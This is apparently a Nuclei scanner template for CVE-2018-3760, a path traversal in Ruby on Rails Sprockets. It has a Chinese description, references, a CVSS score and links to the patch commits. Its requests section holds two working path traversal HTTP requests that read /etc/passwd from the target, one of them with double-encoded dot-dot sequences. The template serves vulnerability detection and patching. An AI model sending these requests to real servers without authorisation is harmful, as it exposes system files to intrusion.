id: CVE-2018-3760
info:
  name: Ruby On Rails Path Traversal
  author:
  - l0ne1y
  tags:
  - cve
  - cve2018
  - rails
  - lfi
  - ruby
  description: |-
    Rails Sprockets <= 3.7.1 任意文件读取漏洞
    Sprockets中存在信息泄露漏洞。在生产中使用Sprockets服务器时，可以使用特制的请求来访问存在于应用程序根目录之外的文件系统上的文件。受影响的版本：4.0.0.beta7及更低版本，3.7.1及更低版本，2.12.4及更低版本。<br>
  reference:
  - https://github.com/vulhub/vulhub/tree/master/rails/cve-2018-3760
  - https://i.blackhat.com/us-18/wed-august-8/us-18-orange-tsai-breaking-parser-logic-take-your-path-normalization-off-and-pop-0days-out-2.pdf
  - https://seclists.org/oss-sec/2018/q2/210
  - https://xz.aliyun.com/t/2542
  severity: high
  classification:
    cve-id:
    - cve-2018-3760
    cwe-id:
    - cwe-200
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
  remediation: |-
    官方修复方案：
    1.目前厂商已发布升级补丁以修复漏洞，补丁获取链接：
    https://github.com/rails/sprockets/commit/c09131cf5b2c479263939c8582e22b98ed616c5f
    https://github.com/rails/sprockets/commit/9c34fa05900b968d74f08ccf40917848a7be9441
    https://github.com/rails/sprockets/commit/18b8a7f07a50c245e9aee7854ecdbe606bbd8bb5
requests:
- matchers:
  - type: regex
    regex:
    - 'root:.*:0:0:'
  - type: status
    status:
    - 200
  extractors:
  - name: path
    type: regex
    regex:
    - '/etc/passwd is no longer under a load path: (.*?),'
    part: body
    internal: true
  matchers-condition: and
  raw:
  - |
    GET /assets/file:%2f%2f/etc/passwd HTTP/1.1
    Host: {{Hostname}}
  - |
    GET /assets/file:%2f%2f{{path}}/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd HTTP/1.1
    Host: {{Hostname}}
